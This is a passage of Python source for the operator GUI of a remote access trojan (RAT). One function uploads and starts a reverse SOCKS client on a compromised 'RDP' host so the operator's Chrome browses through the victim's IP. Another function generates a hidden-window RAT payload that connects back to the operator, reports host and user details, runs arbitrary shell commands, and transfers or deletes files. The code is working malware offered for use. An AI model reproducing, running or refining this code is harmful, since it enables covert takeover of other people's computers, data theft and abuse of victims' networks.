                    ratio = min(max_w/img_w, max_h/img_h)
                    image = image.resize((int(img_w*ratio), int(img_h*ratio)), Image.Resampling.LANCZOS)
                
                photo = ImageTk.PhotoImage(image)
                self.livestream_label.config(image=photo)
                self.livestream_label.image = photo
                
            except:
                pass
    
    def _show_image(self, image, title):
        """Show image"""
        window = tk.Toplevel(self.root)
        window.title(title)
        window.geometry("900x700")
        window.configure(bg=Colors.BG)
        
        # Resize
        max_w, max_h = 880, 680
        img_w, img_h = image.size
        if img_w > max_w or img_h > max_h:
            ratio = min(max_w/img_w, max_h/img_h)
            image = image.resize((int(img_w*ratio), int(img_h*ratio)), Image.Resampling.LANCZOS)
        
        photo = ImageTk.PhotoImage(image)
        label = tk.Label(window, image=photo, bg=Colors.BG)
        label.image = photo
        label.pack(expand=True)
    
    def launch_chrome_proxy(self):
        """Launch Chromium with REVERSE SOCKS proxy through RDP target"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        # Get target IP and admin IP
        target_ip = self.server.sessions[self.current_session]['address'][0]
        
        # Get admin IP (your IP)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            admin_ip = s.getsockname()[0]
            s.close()
        except:
            admin_ip = "127.0.0.1"
        
        self.log(f"🌐 Starting Reverse SOCKS proxy through {target_ip}...", "SUCCESS")
        
        def launch():
            try:
                # Step 1: Start reverse SOCKS relay on YOUR PC
                self.chrome_proxy = ReverseSocksRelay(cmd_port=8001, client_port=8002)
                
                if not self.chrome_proxy.start():
                    self.root.after(0, lambda: self.log("Failed to start relay server", "ERROR"))
                    return
                
                self.root.after(0, lambda: self.log("✓ Relay started: Port 8001(RDP) / 8002(Chrome)", "SUCCESS"))
                time.sleep(1)
                
                # Step 2: Just use tsmin_py3.py directly! Copy exact working code
                with open('tsmin_py3.py', 'r') as f:
                    reverse_client_code = f.read()
                
                # Modify server IP and ADD DEBUG
                reverse_client_code = reverse_client_code.replace(
                    'server = "172.172.131.251"',
                    f'server = "{admin_ip}"'
                )
                reverse_client_code = reverse_client_code.replace(
                    'port = 443',
                    'port = 8001'
                )
                
                # Enable debug mode to see RDP side errors - inject print statements
                import_section = "import socket\nimport struct"
                debug_import = "import socket\nimport struct\nimport sys\n\n# Debug output\ndef debug_print(msg):\n    print(f'[RDP-DEBUG] {msg}', file=sys.stderr, flush=True)\n"
                reverse_client_code = reverse_client_code.replace(import_section, debug_import)
                
                # Add debug before connection attempts
                reverse_client_code = reverse_client_code.replace(
                    'r.connect((ipaddr, port))',
                    'debug_print(f"Connecting to {ipaddr}:{port}"); r.connect((ipaddr, port)); debug_print(f"SUCCESS: {ipaddr}:{port}")'
                )
                
                # Add debug in exception handler (after the existing line)
                reverse_client_code = reverse_client_code.replace(
                    'reply = b"\\x05\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00"',
                    'reply = b"\\x05\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00"; debug_print(f"FAILED to connect {ipaddr}:{port}")'
                )
                
                # Write and send reverse client to RDP
                reverse_file = f"reverse_socks_client_{int(time.time())}.py"
                with open(reverse_file, 'w') as f:
                    f.write(reverse_client_code)
                
                self.root.after(0, lambda: self.log(f"✓ Generated: {reverse_file}", "SUCCESS"))
                
                # Upload to RDP
                with open(reverse_file, 'rb') as f:
                    data = base64.b64encode(f.read()).decode('utf-8')
                
                upload_cmd = f"UPLOAD:{reverse_file}:{data}"
                self.server.send_command(self.current_session, upload_cmd, timeout=60, large_data=True)
                
                self.root.after(0, lambda: self.log("✓ Uploaded reverse client to RDP", "SUCCESS"))
                time.sleep(1)
                
                # Test if RDP can reach admin relay
                test_cmd = f"TERMID:chrome_test:powershell -Command \"Test-NetConnection -ComputerName {admin_ip} -Port 8001\""
                test_result = self.server.send_command(self.current_session, test_cmd, timeout=10)
                
                if test_result and "TcpTestSucceeded" in test_result and "True" in test_result:
                    self.root.after(0, lambda: self.log(f"✓ RDP can reach {admin_ip}:8001", "SUCCESS"))
                else:
                    self.root.after(0, lambda: self.log(f"⚠ Warning: RDP may not reach {admin_ip}:8001", "ERROR"))
                    self.root.after(0, lambda: self.log(f"Check firewall on admin PC!", "ERROR"))
                
                # Execute reverse client on RDP (background with logging)
                log_file = reverse_file.replace('.py', '_log.txt')
                exec_cmd = f"TERMID:chrome_proxy:start /B python {reverse_file} > {log_file} 2>&1"
                exec_result = self.server.send_command(self.current_session, exec_cmd, timeout=2)
                
                self.root.after(0, lambda: self.log("✓ Reverse client started on RDP", "SUCCESS"))
                time.sleep(2)
                
                # Check if it's running
                check_cmd = f"TERMID:chrome_check:powershell -Command \"Get-Process python -ErrorAction SilentlyContinue | Select-Object Id,ProcessName\""
                proc_result = self.server.send_command(self.current_session, check_cmd, timeout=5)
                if proc_result and "python" in proc_result.lower():
                    self.root.after(0, lambda: self.log("✓ Python process found on RDP", "SUCCESS"))
                else:
                    self.root.after(0, lambda: self.log("⚠ No Python process found!", "ERROR"))
                
                time.sleep(1)
                
                # Check if relay received connection
                if self.chrome_proxy.con_cmd:
                    self.root.after(0, lambda: self.log("✓ RDP connected to relay!", "SUCCESS"))
                else:
                    self.root.after(0, lambda: self.log("⚠ RDP not connected to relay", "ERROR"))
                    self.root.after(0, lambda: self.log(f"Debug: Check {reverse_file} on RDP", "ERROR"))
                
                # Step 3: Find Chrome
                os_type = platform.system()
                chrome_path = None
                
                if os_type == "Windows":
                    paths = [
                        r"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                        r"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
                        os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe"),
                    ]
                    for path in paths:
                        if os.path.exists(path):
                            chrome_path = path
                            break
                
                if not chrome_path:
                    self.root.after(0, lambda: self.log("Chrome not found! Install Chrome.", "ERROR"))
                    return
                
                # Step 4: Launch Chrome with SOCKS proxy
                profile_dir = os.path.join(os.path.expanduser("~"), ".rat_chrome_proxy")
                os.makedirs(profile_dir, exist_ok=True)
                
                args = [
                    chrome_path,
                    f"--user-data-dir={profile_dir}",
                    "--proxy-server=socks5://127.0.0.1:8002",
                    "--new-window",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "https://www.whatismyip.com"
                ]
                
                self.chrome_process = subprocess.Popen(args)
                
                self.root.after(0, lambda: self.log(f"🌐 Chrome launched! IP = {target_ip}", "SUCCESS"))
                self.root.after(0, lambda: self.log("✓ Visit whatismyip.com to verify!", "SUCCESS"))
                
                # Show RDP log after 3 seconds
                time.sleep(3)
                log_cmd = f"TERMID:chrome_log:type {log_file}"
                log_content = self.server.send_command(self.current_session, log_cmd, timeout=5)
                if log_content:
                    self.root.after(0, lambda: self.log(f"=== RDP Client Log ===", "INFO"))
                    for line in log_content.strip().split('\n')[:20]:  # First 20 lines
                        self.root.after(0, lambda l=line: self.log(f"  {l}", "INFO"))
                
                # Cleanup local file
                try:
                    os.remove(reverse_file)
                except:
                    pass
                
            except Exception as e:
                self.root.after(0, lambda: self.log(f"Error: {e}", "ERROR"))
                if self.chrome_proxy:
                    self.chrome_proxy.stop()
        
        threading.Thread(target=launch, daemon=True).start()
    
    def generate_payload(self):
        """Generate payload"""
        ip = simpledialog.askstring("Server IP", "Enter your server IP address:")
        if not ip:
            return
        
        port = self.port_var.get()
        
        payload_code = f'''#!/usr/bin/env python3
"""RAT Payload - Auto-generated"""
import socket, json, subprocess, platform, os, sys, time, base64

SERVER_IP = "{ip}"
SERVER_PORT = {port}

class Client:
    def __init__(self):
        self.current_dir = os.getcwd()
        self.terminal_dirs = {{}}  # Track directory per terminal ID
    
    def get_system_info(self):
        return {{
            'os': platform.system(),
            'hostname': platform.node(),
            'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
            'platform': platform.platform()
        }}
    
    def execute_command(self, cmd):
        try:
            # Extract terminal ID if present (format: TERMID:term_123:command)
            terminal_id = "default"
            actual_cmd = cmd
            
            if cmd.startswith("TERMID:"):
                parts = cmd.split(":", 2)
                if len(parts) >= 3:
                    terminal_id = parts[1]
                    actual_cmd = parts[2]
            
            # Get or initialize directory for this terminal
            if terminal_id not in self.terminal_dirs:
                self.terminal_dirs[terminal_id] = self.current_dir
            
            work_dir = self.terminal_dirs[terminal_id]
            
            # Handle special commands
            if actual_cmd.startswith("LISTDIR"):
                files = []
                for item in os.listdir(self.current_dir):
                    path = os.path.join(self.current_dir, item)
                    if os.path.isfile(path):
                        size = f"{{os.path.getsize(path)}} B"
                        mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(path)))
                        files.append({{'name': item, 'size': size, 'modified': mtime}})
                return json.dumps(files) + "<<<END>>>"
            
            elif cmd.startswith("UPLOAD:"):
                parts = cmd.split(":", 2)
                filename = parts[1]
                data = base64.b64decode(parts[2])
                filepath = os.path.join(self.current_dir, filename)
                with open(filepath, 'wb') as f:
                    f.write(data)
                return f"Uploaded: {{filename}}<<<END>>>"
            
            elif cmd.startswith("DOWNLOAD:"):
                filename = cmd.split(":", 1)[1]
                filepath = os.path.join(self.current_dir, filename)
                with open(filepath, 'rb') as f:
                    data = base64.b64encode(f.read()).decode('utf-8')
                return f"{{filename}}:{{data}}<<<END>>>"
            
            elif cmd.startswith("DELETE:"):
                filename = cmd.split(":", 1)[1]
                filepath = os.path.join(self.current_dir, filename)
                os.remove(filepath)
                return f"Deleted: {{filename}}<<<END>>>"
            
            elif actual_cmd.startswith("cd "):
                target = actual_cmd[3:].strip()
                if target == "..":
                    work_dir = os.path.dirname(work_dir)
                elif os.path.isabs(target):
                    work_dir = target
                else:
                    work_dir = os.path.join(work_dir, target)
                
                # Update this terminal's directory
                self.terminal_dirs[terminal_id] = work_dir
                return f"Changed to: {{work_dir}}<<<END>>>"
            
            # Regular command - execute in this terminal's directory
            result = subprocess.run(actual_cmd, shell=True, capture_output=True, text=True, 
                                  timeout=60, cwd=work_dir)
            output = result.stdout + result.stderr
            if not output:
                output = "Command executed"
            return output + "<<<END>>>"
            
        except subprocess.TimeoutExpired:
            return "Timeout<<<END>>>"
        except Exception as e:
            return f"Error: {{e}}<<<END>>>"
    
    def main(self):
        while True:
            try:
                sock = socket.socket()
                sock.connect((SERVER_IP, SERVER_PORT))
                sock.sendall(json.dumps(self.get_system_info()).encode('utf-8'))
                
                while True:
                    # Receive command (receive until newline - server.py protocol)
                    data = b""
                    while b'\\n' not in data:
                        chunk = sock.recv(1024)
                        if not chunk:
                            raise ConnectionError("No data")
                        data += chunk
                    
                    msg = json.loads(data.decode('utf-8').strip())
                    cmd = msg.get('cmd', '')
                    if cmd:
                        result = self.execute_command(cmd)
                        sock.sendall(result.encode('utf-8', errors='ignore'))
            except:
                pass
            time.sleep(30)

if __name__ == "__main__":
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    Client().main()
'''
        
        filename = f"rat_payload_{int(time.time())}.py"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(payload_code)
        
        self.log(f"Payload generated: {filename}", "SUCCESS")
        self.log(f"Run on target: python {filename}")
    
    def run(self):
        """Run GUI"""
        self.root.mainloop()

if __name__ == "__main__":
    app = RATGUI()
    app.run()
